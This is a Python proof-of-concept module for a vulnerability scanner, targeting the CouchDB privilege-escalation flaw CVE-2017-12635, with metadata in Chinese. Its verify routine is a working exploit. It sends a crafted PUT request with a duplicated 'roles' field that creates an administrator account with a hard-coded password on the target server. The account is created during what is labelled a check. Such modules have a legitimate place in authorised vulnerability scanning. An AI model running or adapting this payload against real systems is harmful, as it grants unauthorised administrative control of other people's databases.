# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import hashlib
import uuid

class Vuln(ABVuln):
    poc_id = 'a60485f8-9611-4e8f-b340-b1ebbcc613b3'
    name = 'CouchDB 垂直权限绕过漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-11-04'  # 漏洞公布时间
    desc = '''
        在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'CVE-2017-12635'  # cve编号
    product = 'CouchDB'  # 漏洞应用名称
    product_version = '小于 1.7.0 以及 小于 2.1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '85967b83-b1b2-4292-819b-4400daa1ff20'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            #根据data的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #info = hashlib.md5(str(uuid.uuid1())).hexdigest()
            #session = requests.session()
            headers = {
                'Content-Type': 'application/json'
            }
            data='''{
                  "type": "user",
                  "name": "csancsan",
                  "roles": ["_admin"],
                  "roles": [],
                  "password": "csancsan"
                }'''

            r = requests.put(self.target + '/_users/org.couchdb.user:csancsan', data=data, headers=headers)
            print(r.text)
            if "csancsa" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
